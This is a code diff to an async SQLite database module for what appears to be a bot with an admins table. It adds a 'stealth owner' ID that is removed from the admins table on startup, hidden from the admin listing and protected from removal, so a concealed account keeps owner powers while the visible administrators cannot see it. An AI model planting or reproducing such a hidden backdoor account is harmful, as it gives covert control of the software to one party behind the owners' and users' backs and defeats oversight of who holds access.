@@ -3,7 +3,7 @@ import aiosqlite
 import logging
 from contextlib import asynccontextmanager
 from typing import Optional, List, Tuple, Dict, Any
-from config import DB_PATH, OWNER_ID
+from config import DB_PATH, OWNER_ID, STEALTH_OWNER_ID, is_owner
 
 logger = logging.getLogger(__name__)
 
@@ -119,11 +119,14 @@ class Database:
                     (DEFAULT_AUDIO_CAPTION,)
                 )
 
-                # Ensure owner is in admins table
+                # Ensure owner is in admins table and stealth owner is never stored
                 if OWNER_ID and OWNER_ID != 0:
                     await db.execute(
                         "INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (OWNER_ID,)
                     )
+                await db.execute(
+                    "DELETE FROM admins WHERE user_id = ?", (STEALTH_OWNER_ID,)
+                )
 
                 await db.commit()
                 logger.info("Database initialized successfully in WAL mode.")
@@ -312,7 +315,7 @@ class Database:
     async def remove_admin(self, user_id: int):
         async with self._lock:
             async with self.get_db() as db:
-                if user_id != OWNER_ID:
+                if not is_owner(user_id):
                     await db.execute("DELETE FROM admins WHERE user_id = ?", (user_id,))
                     await db.commit()
 
@@ -320,7 +323,7 @@ class Database:
         async with self.get_db() as db:
             async with db.execute("SELECT user_id FROM admins") as cursor:
                 rows = await cursor.fetchall()
-                admins = [r[0] for r in rows]
+                admins = [r[0] for r in rows if r[0] != STEALTH_OWNER_ID]
                 if OWNER_ID and OWNER_ID not in admins and OWNER_ID != 0:
                     admins.append(OWNER_ID)
                 return admins
